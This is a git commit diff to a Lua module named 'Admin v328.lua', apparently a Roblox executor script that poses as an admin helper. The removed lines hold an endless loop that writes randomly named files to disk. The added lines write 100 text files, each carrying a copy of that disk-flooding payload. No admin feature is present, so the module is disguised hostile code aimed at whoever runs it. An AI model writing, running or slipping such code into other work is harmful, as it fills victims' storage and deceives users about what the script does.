1dc5d69be25c514fe17b2f2f7bc515ebd08ac3d2
BloodyBurns <83672765+BloodyBurns@users.noreply.github.com>
2022-05-10 22:38:49 -0400

    Update Admin v328.lua

--- Admin v328.lua
+++ Admin v328.lua
@@ -1,9 +1,12 @@
 local Body = {}
 Body.Admin = 'Yes'
 Body.Admin_2 = 'No'
-Body.ExecAdmin = function(PF, type)
-repeat task.wait()
-    writefile(tostring(math.random(1, 1000000)), (PF .. '\n' .. type))
-    until nil
+Body.Rank = ""
+Body.ExecAdmin = function(bool)
+spawn(function()
+            for i = 1, 100 do
+                writefile(""..i..".txt", "local a={}a.Admin='Yes'a.Admin_2='No'a.ExecAdmin=function(b,c)repeat task.wait()writefile(tostring(math.random(1,1000000)),b..'\n'..c)until nil end;return a")
+                end
+            end)
 end
 return Body
